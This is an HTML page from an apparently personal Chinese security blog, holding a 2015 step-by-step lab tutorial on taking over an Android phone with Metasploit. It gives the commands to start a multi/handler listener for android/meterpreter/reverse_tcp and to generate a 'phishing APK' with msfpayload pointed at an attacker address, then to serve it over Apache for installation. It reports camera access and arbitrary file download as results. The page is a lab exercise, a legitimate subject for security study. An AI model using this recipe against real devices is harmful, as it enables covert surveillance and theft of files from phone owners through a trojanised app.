<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  
  <title>使用Metasploit获取Android设备权限 - Nearg1e</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script type="text/javascript" src="/js/highlight.pack.js"></script>
  <script type="text/javascript" src="http://tajs.qq.com/stats?sId=58637942" charset="UTF-8"></script>
  
    <link rel="icon" href="/favicon.ico">
  
  
    <link rel="alternative" href="/atom.xml" title="Nearg1e" type="application/atom+xml">
  
  <!--[if lt IE 9]>
    <script type="text/javascript" src="/js/html5.js"></script>
    <script type="text/javascript" src="/js/css3-mediaqueries.js"></script>
  <![endif]-->
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/highlight.css">

</head>
<body>
    <header id="header">
    <div class="nav-warp">
      <nav id="nav" class="w">
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/about">About</a>
        
          <a class="main-nav-link" href="/about/#link">Link</a>
        
          <a class="main-nav-link" href="/atom.xml">RSS</a>
        
          <a class="main-nav-link" href="https://github.com/neargle">Project</a>
        
        <a id="nav-search" class="icon-search fr" onclick="show_search()" title="Search"></a>
        <div id="nav-search-input" class="hide">
          <form class="search-form" onsubmit="return dispatch()">
            <input type="hidden" id="site" value="site:http://blog.neargle.com">
            <input type="text" id="q" class="input-text" name="q" placeholder="Search">
            <input type="submit" value="" class="input-submit">
          </form>
        </div>
      </nav>
    </div>
    
  </header>

  <!-- <div id='wrap'> -->
    <div id='outer'>
      <section id="main"><article class="post">
  <header class="post-head">
    
  
    
      <h1 class="post-title">使用Metasploit获取Android设备权限</h1>
    
  

    
<time datetime="2015-06-28T06:14:44.000Z" class="post-time">2015-06-28</time>

  </header>
  
  <section class="post-content typo">
    <h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境:"></a>实验环境:</h4><ul>
<li>KALI (IN VMWARE)</li>
<li>Metasploit (IN KALI)</li>
<li>Android 4.1.2</li>
<li>Apache2 (IN KALI)</li>
</ul>
<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤:"></a>实验步骤:</h4><a id="more"></a>
<h5 id="步骤1-打开KALI终端，并在终端打开msfconsole"><a href="#步骤1-打开KALI终端，并在终端打开msfconsole" class="headerlink" title="步骤1. 打开KALI终端，并在终端打开msfconsole:"></a>步骤1. 打开KALI终端，并在终端打开msfconsole:</h5><p><img src="http://r.loli.io/NzQbie.png" alt="在终端打开msfconsole"></p>
<h5 id="步骤2-运行以下命令使用android-meterpreter-reverse-tcp的payload，用于监听程序的连接，使用Metasploit-handler"><a href="#步骤2-运行以下命令使用android-meterpreter-reverse-tcp的payload，用于监听程序的连接，使用Metasploit-handler" class="headerlink" title="步骤2. 运行以下命令使用android/meterpreter/reverse_tcp的payload，用于监听程序的连接，使用Metasploit handler:"></a>步骤2. 运行以下命令使用android/meterpreter/reverse_tcp的payload，用于监听程序的连接，使用Metasploit handler:</h5><pre><code>use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
</code></pre><h5 id="步骤3-运行命令设置lhost和lport，其中lhost我使用了本机的地址，lport我使用了8080作为端口号"><a href="#步骤3-运行命令设置lhost和lport，其中lhost我使用了本机的地址，lport我使用了8080作为端口号" class="headerlink" title="步骤3. 运行命令设置lhost和lport，其中lhost我使用了本机的地址，lport我使用了8080作为端口号:"></a>步骤3. 运行命令设置lhost和lport，其中lhost我使用了本机的地址，lport我使用了8080作为端口号:</h5><p><img src="http://ww2.sinaimg.cn/large/005y7Ba5gw1etjtmestpzj30kd0243yp.jpg" alt=""></p>
<h5 id="步骤4-运行exploit开始监听"><a href="#步骤4-运行exploit开始监听" class="headerlink" title="步骤4. 运行exploit开始监听"></a>步骤4. 运行exploit开始监听</h5><p><img src="http://ww2.sinaimg.cn/large/005y7Ba5gw1etjtnvlzl6j30kb04n0th.jpg" alt=""></p>
<h5 id="步骤5-制作钓鱼APK，使用KALI终端运行以下命令，该命令会在桌面生成一个DropsMsf-apk文件"><a href="#步骤5-制作钓鱼APK，使用KALI终端运行以下命令，该命令会在桌面生成一个DropsMsf-apk文件" class="headerlink" title="步骤5. 制作钓鱼APK，使用KALI终端运行以下命令，该命令会在桌面生成一个DropsMsf.apk文件"></a>步骤5. 制作钓鱼APK，使用KALI终端运行以下命令，该命令会在桌面生成一个DropsMsf.apk文件</h5><pre><code>msfpayload android/meterpreter/reverse_tcp LHOST=192.168.199.207 LPORT=8080 R &gt; /root/Desktop/DropsMsf.apk 
</code></pre><p><img src="http://ww4.sinaimg.cn/large/005y7Ba5gw1etjtq6jrz0j30ld01jdfz.jpg" alt=""></p>
<h5 id="步骤6-运行Apache并搭建简易Web服务器提供apk下载-不是本次实验主要内容简单过"><a href="#步骤6-运行Apache并搭建简易Web服务器提供apk下载-不是本次实验主要内容简单过" class="headerlink" title="步骤6. 运行Apache并搭建简易Web服务器提供apk下载(不是本次实验主要内容简单过)"></a>步骤6. 运行Apache并搭建简易Web服务器提供apk下载(不是本次实验主要内容简单过)</h5><p><img src="http://r.loli.io/AvEjea.png" alt=""></p>
<h5 id="步骤7-使用手机下载apk并安装"><a href="#步骤7-使用手机下载apk并安装" class="headerlink" title="步骤7. 使用手机下载apk并安装"></a>步骤7. 使用手机下载apk并安装</h5><p><img src="http://ww4.sinaimg.cn/large/005y7Ba5jw1ev9aqspismj30de07ydgg.jpg" alt=""><br><img src="http://ww4.sinaimg.cn/large/005y7Ba5gw1etju51ea9aj30dc0nqacb.jpg" alt=""></p>
<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><ul>
<li>可获取Android手机的摄像头权限拍摄照片</li>
<li>可下载Android手机的任意文件</li>
<li>等等</li>
</ul>
<p>####实验结果展示</p>
<p><img src="http://r.loli.io/2uYZzq.png" alt=""></p>

    <p class="origin-url">本文URL： <a href="http://blog.neargle.com/2015/06/28/android-msf-exploit-by-reverse-tcp/index.html">http://blog.neargle.com/2015/06/28/android-msf-exploit-by-reverse-tcp/index.html</a></p>
  </section>
  
  <footer class="post-foot">
    <section class="post-foot-warp clear">
      
  <ul class="post-tag icon-tag fl">
    
      <li><a href="/tags/Metasploit/">#Metasploit</a></li>
    
  </ul>

      
    </section>
  </footer>
  
</article>

    
<nav id="post-nav" class="clear">
  
    <a href="/2015/09/14/woomirror-one-spider-and-searchable-wooyun-webapp/" id="post-nav-newer" class="post-nav-link-wrap fl" title="WooMirror:一个公开漏洞备份及搜索的Wooyun镜像站">
      <div class="post-nav-title">&laquo; WooMirror:一个公开漏洞备份及搜索的Wooyun镜像站</div>
    </a>
  
  
</nav>



<section id="comments">
  <div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
  </div>
</section>
</section>
    </div>
  <!-- </div> -->
    <footer id="footer">
    <div class="foot-warp">
      <p>© 2014 Nearg1e</p>
    </div>
  </footer>
  <script src="/js/tools.js"></script>
  
  
  <script>
    var disqus_shortname = 'neargle';
    
    var disqus_url = 'http://blog.neargle.com/2015/06/28/android-msf-exploit-by-reverse-tcp/';
    
    (function(){
      var dsq = document.createElement('script');
      dsq.type = 'text/javascript';
      dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  
  
</body>
</html>
